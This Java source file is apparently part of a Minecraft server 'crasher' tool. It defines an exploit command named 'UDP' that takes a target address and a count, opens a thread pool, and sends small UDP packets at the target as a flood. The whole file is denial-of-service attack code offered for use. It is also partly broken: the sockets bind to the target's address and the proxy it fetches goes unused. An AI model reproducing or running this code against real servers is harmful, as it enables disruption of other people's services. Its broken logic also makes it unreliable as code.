package uwu.narumi.crasher.core.exploit;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.concurrent.Executors;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.ProxyHelper;

@ExploitInfo(
    name = "UDP",
    description = "XD",
    usage = "exploit udp <address> <amount>"
)
public class UDP extends Exploit<byte[]> {

  public UDP() {
    super(() -> new byte[]{0, 0, 0},
        new Argument("address", 0, McAddress.class),
        new Argument("amount", 1, Integer.class)
    );
  }

  //JUST MEME
  @Override
  public void execute(Object... args) throws ExploitException {
    McAddress address = (McAddress) args[0];
    int amount = (int) args[1];

    InetSocketAddress inetSocketAddress = new InetSocketAddress(address.getIp(), address.getPort());
    DatagramPacket packet = new DatagramPacket(new byte[3], 3, inetSocketAddress);

    index.set(0);
    executor = Executors.newFixedThreadPool(amount);
    for (int i = 0; i < amount; i++) {
      executor.execute(() -> {
        Proxy proxy = ProxyHelper.getSocks();
        try (DatagramSocket socket = new DatagramSocket(inetSocketAddress)) {
          socket.send(packet);
          System.out.println(String.format(" %s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
        } catch (Exception ignored) {
        }
      });
    }
  }
}
